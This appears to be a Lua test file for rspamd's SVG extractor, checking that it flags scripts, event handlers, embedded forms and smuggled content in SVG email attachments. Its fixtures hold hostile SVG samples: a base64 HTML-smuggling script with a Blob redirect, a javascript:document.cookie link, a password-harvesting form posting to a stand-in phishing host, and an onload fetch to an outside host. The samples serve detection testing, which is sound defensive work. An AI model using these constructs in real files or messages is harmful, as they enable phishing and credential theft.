context("SVG content extraction", function()
  local svg = require "lua_content/svg"
  local rspamd_util = require "rspamd_util"

  local clean = [[<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    width="200" height="100" viewBox="0 0 200 100">
  <title>Company logo</title>
  <desc>Vector logo &amp; tagline</desc>
  <a xlink:href="https://www.example.com/">
    <text x="10" y="20">Example <tspan font-weight="bold">Corp</tspan></text>
  </a>
  <image href="data:image/png;base64,iVBORw0KGgo=" width="10" height="10"/>
  <use href="#logo"/>
  <text x="10" y="50">Since&nbsp;1999</text>
</svg>]]

  local html_payload = '<html><body><a href="https://payload.example.com/login">Sign in</a></body></html>'
  local encoded_payload = tostring(rspamd_util.encode_base64(html_payload))

  local smuggling = string.format([=[<svg xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink" onload="init()">
  <script type="text/javascript"><![CDATA[
    var payload = atob("%s");
    var blob = new Blob([payload], { type: "text/html" });
    window.location = URL.createObjectURL(blob);
  ]]></script>
  <a href="javascript:alert(document.cookie)"><text>Click</text></a>
  <a xlink:href="data:text/html;base64,%s">Open</a>
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://redirect.example.com/"/>
      <form action="https://phish.example.com/collect" method="post">
        <p>Enter your password</p>
        <input type="password" name="pw"/>
      </form>
      <iframe src="https://frame.example.com/"></iframe>
      <script src="https://cdn.example.com/evil.js"></script>
    </body>
  </foreignObject>
  <image xlink:href="https://tracker.example.com/pixel.png" width="1" height="1"/>
  <set attributeName="xlink:href" to="javascript:void(0)"/>
  <style>.bg { background: url("https://css.example.com/bg.png"); }</style>
</svg>]=], encoded_payload, encoded_payload)

  local function set_of(list)
    local result = {}
    for _, value in ipairs(list or {}) do result[tostring(value)] = true end
    return result
  end

  test("extracts text and links from a plain drawing", function()
    local extracted, err = svg.extract(clean)
    assert_not_nil(extracted, err)
    local text = tostring(extracted.text)
    assert_not_nil(text:find("Company logo\n", 1, true))
    assert_not_nil(text:find("Vector logo & tagline\n", 1, true))
    assert_not_nil(text:find("Example Corp\n", 1, true))
    assert_not_nil(text:find("Since", 1, true))
    assert_equal(text:find("&nbsp;", 1, true), nil)
    assert_equal(extracted.urls[1], "https://www.example.com/")
    assert_equal(#extracted.urls, 1)
    assert_equal(extracted.hyperlinks, 1)
    assert_equal(extracted.scripts, 0)
    assert_equal(extracted.event_handlers, 0)
    assert_equal(extracted.javascript_urls, 0)
    assert_equal(extracted.foreign_objects, 0)
    assert_equal(extracted.data_uris, 1)
    assert_equal(extracted.data_uri_types[1], "image/png")
    assert_equal(#extracted.payloads, 0)
    assert_equal(#extracted.resources, 0)
    assert_equal(extracted.doctype, true)
    assert_equal(extracted.width, "200")
    assert_equal(extracted.height, "100")
    assert_equal(extracted.view_box, "0 0 200 100")
  end)

  test("reports scripting, smuggled HTML and phishing constructs", function()
    local extracted, err = svg.extract(smuggling)
    assert_not_nil(extracted, err)
    assert_equal(extracted.scripts, 2)
    assert_equal(extracted.external_scripts, 1)
    assert_equal(extracted.event_handlers, 1)
    assert_equal(extracted.javascript_urls, 2)
    assert_equal(extracted.foreign_objects, 1)
    assert_equal(extracted.forms, 1)
    assert_equal(extracted.password_inputs, 1)
    assert_equal(extracted.meta_refresh, 1)
    assert_equal(extracted.embedded_documents, 1)
    assert_equal(extracted.css_urls, 1)
    assert_equal(extracted.data_uris, 1)
    assert_equal(extracted.data_uri_types[1], "text/html")

    local indicators = set_of(extracted.script_indicators)
    assert_equal(indicators.atob, true)
    assert_equal(indicators.Blob, true)
    assert_equal(indicators.createObjectURL, true)
    assert_equal(indicators.location, true)
    assert_equal(indicators.eval, nil)

    assert_equal(#extracted.payloads, 1)
    assert_equal(extracted.payloads[1].type, "text/html")
    assert_equal(extracted.payloads[1].content, html_payload)

    local urls = set_of(extracted.urls)
    assert_equal(urls["https://redirect.example.com/"], true)
    assert_equal(urls["https://phish.example.com/collect"], true)
    assert_equal(urls["https://frame.example.com/"], true)
    assert_equal(urls["https://cdn.example.com/evil.js"], true)
    assert_equal(urls["https://tracker.example.com/pixel.png"], true)
    assert_equal(urls["https://css.example.com/bg.png"], true)
    assert_equal(urls["javascript:alert(document.cookie)"], nil)

    local kinds = {}
    for _, resource in ipairs(extracted.resources) do kinds[resource.kind] = resource.url end
    assert_equal(kinds.script, "https://cdn.example.com/evil.js")
    assert_equal(kinds.iframe, "https://frame.example.com/")
    assert_equal(kinds.image, "https://tracker.example.com/pixel.png")
    assert_equal(kinds.css, "https://css.example.com/bg.png")

    local text = tostring(extracted.text)
    assert_not_nil(text:find("Click", 1, true))
    assert_not_nil(text:find("Enter your password", 1, true))
    assert_equal(text:find("atob", 1, true), nil)
    assert_equal(text:find("background", 1, true), nil)
  end)

  test("honours a declared legacy encoding", function()
    local latin1 = '<?xml version="1.0" encoding="ISO-8859-1"?>' ..
        '<svg xmlns="http://www.w3.org/2000/svg"><text>caf\233</text></svg>'
    local extracted, err = svg.extract(latin1)
    assert_not_nil(extracted, err)
    assert_not_nil(tostring(extracted.text):find("caf\195\169", 1, true))
  end)

  test("rejects DTD internal subsets and foreign roots", function()
    local extracted, err = svg.extract([[<!DOCTYPE svg [<!ENTITY x "<script>">]>
      <svg xmlns="http://www.w3.org/2000/svg">&x;</svg>]])
    assert_equal(extracted, nil)
    assert_not_nil(err:find("DTD internal subsets", 1, true))

    extracted, err = svg.extract('<html xmlns="http://www.w3.org/1999/xhtml"><svg/></html>')
    assert_equal(extracted, nil)
    assert_not_nil(err:find("not an SVG", 1, true))

    extracted, err = svg.extract('<svg xmlns="http://www.w3.org/2000/svg"><text>a</text>')
    assert_equal(extracted, nil)
    assert_not_nil(err:find("unclosed", 1, true))
  end)

  test("enforces text and structural limits", function()
    local extracted, err = svg.extract(clean, { max_text = 8 })
    assert_equal(extracted, nil)
    assert_not_nil(err:find("text limit", 1, true))

    extracted, err = svg.extract(clean, { xml = { max_depth = 1 } })
    assert_equal(extracted, nil)
    assert_not_nil(err:find("depth limit", 1, true))

    extracted, err = svg.extract(smuggling, { max_payload_size = 8 })
    assert_not_nil(extracted, err)
    assert_equal(#extracted.payloads, 1)
    assert_equal(#extracted.payloads[1].content, 8)
    assert_equal(extracted.payloads[1].truncated, true)
    assert_equal(extracted.payloads[1].content, html_payload:sub(1, 8))
  end)

  local function make_task(part)
    local rspamd_mempool = require "rspamd_mempool"
    local cache = {}
    local task = {
      pool = rspamd_mempool.create(),
      injected = {},
      injected_urls = {},
      cache_set = function(_, key, value) cache[key] = value end,
      cache_get = function(_, key) return cache[key] end,
      get_mempool = function(self) return self.pool end,
    }
    -- telescope assertions are only visible inside test bodies, so the
    -- mocks record what they get and the tests check it afterwards
    task.inject_part = function(_, kind, value, parent)
      task.injected[#task.injected + 1] = { kind = kind, value = tostring(value), parent = parent }
    end
    task.inject_url = function(_, url, parent)
      task.injected_urls[tostring(url)] = parent
    end
    return task
  end

  local function make_part(content, id, is_archive)
    return {
      get_type = function() return 'image', 'svg+xml' end,
      get_detected_ext = function() return is_archive and 'gz' or 'svg' end,
      is_archive = function() return is_archive or false end,
      is_specific = function() return false end,
      get_specific = function() return nil end,
      get_content = function() return content end,
      get_id = function() return id end,
      set_specific = function(self, value) self.specific = value end,
    }
  end

  test("dispatches a compressed SVGZ and injects the smuggled HTML", function()
    local lua_content = require "lua_content"
    local compressed = rspamd_util.gzip_compress(smuggling)
    local part = make_part(compressed, 71, true)
    local task = make_task(part)

    lua_content.maybe_process_mime_part(part, task)
    local specific = lua_content.get_specific(part, task)
    assert_not_nil(specific)
    assert_equal(specific.tag, 'svg')
    assert_equal(specific.suspicious, nil)
    assert_equal(specific.scripts, 2)
    assert_equal(specific.foreign_objects, 1)
    assert_equal(specific.payload_types[1], 'text/html')
    assert_equal(task.injected_urls["https://phish.example.com/collect"], part)

    local kinds = {}
    for _, injected in ipairs(task.injected) do
      assert_equal(injected.parent, part)
      kinds[injected.kind] = injected.value
    end
    assert_not_nil(kinds.text:find("Enter your password", 1, true))
    assert_equal(kinds.html, html_payload)
  end)

  test("folds a nested SVG payload into the outer document", function()
    local lua_content = require "lua_content"
    local inner = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://inner.example.com/\')"/>'
    local outer = string.format('<svg xmlns="http://www.w3.org/2000/svg">' ..
        '<use href="data:image/svg+xml;base64,%s"/></svg>',
        tostring(rspamd_util.encode_base64(inner)))
    local part = make_part(outer, 72)
    local task = make_task(part)

    lua_content.maybe_process_mime_part(part, task)
    local specific = part.specific
    assert_not_nil(specific)
    assert_equal(specific.tag, 'svg')
    assert_equal(specific.nested_documents, 1)
    assert_equal(specific.event_handlers, 1)
    assert_equal(specific.data_uri_types[1], 'image/svg+xml')
    assert_equal(set_of(specific.script_indicators).fetch, true)
  end)

  test("marks unparseable SVG as suspicious with a reason", function()
    local lua_content = require "lua_content"
    local part = make_part('<svg xmlns="http://www.w3.org/2000/svg"><text>broken', 73)
    local task = make_task(part)
    lua_content.maybe_process_mime_part(part, task)
    assert_not_nil(part.specific)
    assert_equal(part.specific.suspicious, true)
    assert_equal(part.specific.reason, 'xml')

    part = make_part('\31\139not really gzip', 74, true)
    task = make_task(part)
    lua_content.maybe_process_mime_part(part, task)
    local specific = lua_content.get_specific(part, task)
    assert_equal(specific.suspicious, true)
    assert_equal(specific.reason, 'gzip')
  end)
end)
